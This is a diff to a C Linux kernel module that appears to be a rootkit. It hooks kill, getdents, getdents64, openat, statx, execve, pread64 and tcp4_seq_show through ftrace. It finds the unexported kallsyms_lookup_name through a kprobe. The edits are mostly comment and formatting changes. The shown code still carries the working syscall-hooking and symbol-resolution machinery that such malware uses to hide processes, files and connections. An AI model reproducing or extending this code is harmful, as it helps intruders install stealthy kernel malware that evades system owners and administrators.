@@ -10,7 +10,7 @@
 #include <linux/uaccess.h>
 #include <linux/netdevice.h> // sk_buff, packet_type
 /*
-Note: hooking is achievable also with kprobe, for now ftrace is the choice for being common 
+Note: hooking is achievable also with kprobe, for now ftrace is the choice for being more common 
 If your kernel is built with CONFIG_OPTPROBES=y (currently this flag is automatically set 'y' on x86/x86-64,
 non-preemptive kernel) and the "debug.kprobes_optimization" kernel parameter is set to 1 (see sysctl(8)),
 Kprobes tries to reduce probe-hit overhead by using a jump instruction instead of a breakpoint instruction at each probepoint.
@@ -21,10 +21,11 @@ Hooking is also achievable with changing the cr0 register to disable memory prot
 can keep the hooks instead of having them in an array to have O(1) instead of O(n)
 */
 
-const int ACTIVE_HOOKS_SIZE = 16; /*Available number of hooks to store*/
+const int ACTIVE_HOOKS_SIZE = 16; // Available number of hooks to store
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *); // the kallsyms_lookup_name function prototype pointer
 
 #ifdef PTREGS_SYSCALL_STUB
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions, can be long even for int ret*/
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); // define type for syscalls functions, can be long even for int ret
 ptregs_t orig_kill;
 ptregs_t orig_getdents64;
 ptregs_t orig_getdents;
@@ -33,7 +34,7 @@ ptregs_t orig_openat;
 ptregs_t orig_statx;
 ptregs_t orig_execve;
 static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
-//static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
+// static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
 #else
 // remove arg names for definitions
 static asmlinkage int (*orig_kill)(pid_t pid, int sig);
@@ -43,7 +44,7 @@ static asmlinkage int (*orig_reboot)(int magic, int magic2, int cmd, void *arg);
 static asmlinkage int (*orig_openat)(int dfd, const char *filename, int flags, umode_t mode);
 static asmlinkage int (*orig_statx)(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf);
 static asmlinkage ssize_t (*orig_pread64)(unsigned int fd, char *buf, size_t count, loff_t pos);
-//static asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
+// static asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
 static asmlinkage int (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]);
 #endif
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
@@ -89,19 +90,18 @@ struct ftrace_hook {
 };
 
 /* Ftrace needs to know the address of the original function that we
- * are going to hook. As before, we just use kallsyms_lookup_name() 
+ * are going to hook. We just use kallsyms_lookup_name() 
  * to find the address in kernel memory.
+ * can also get its addres using user-space program to locate it in /proc/kallsyms and pass it with module_param(kallsyms_lookup_name_new, ulong, S_IRUGO)
  * */
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
 {
     static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name" // ready the kbrobe to probe the kallsyms_lookup_name function
+    	.symbol_name = "kallsyms_lookup_name" // ready the kbrobe to probe the kallsyms_lookup_name function
     };
 
-    typedef unsigned long (*kallsyms_lookup_name_t)(const char *); // the kallsyms_lookup_name function prototype
     #if LINUX_VERSION_CODE > KERNEL_VERSION(5, 8, 0)
         kallsyms_lookup_name_t kallsyms_lookup_name_new;
-		// can also get its addres using user-space program to locate it in /proc/kallsyms and pass it with module_param(kallsyms_lookup_name_new, ulong, S_IRUGO)
 		register_kprobe(&kp);
         kallsyms_lookup_name_new = (kallsyms_lookup_name_t)kp.addr; // get address of function
         hook->address = (unsigned long)kallsyms_lookup_name_new(hook->name); // get starting point of syscall table in memory
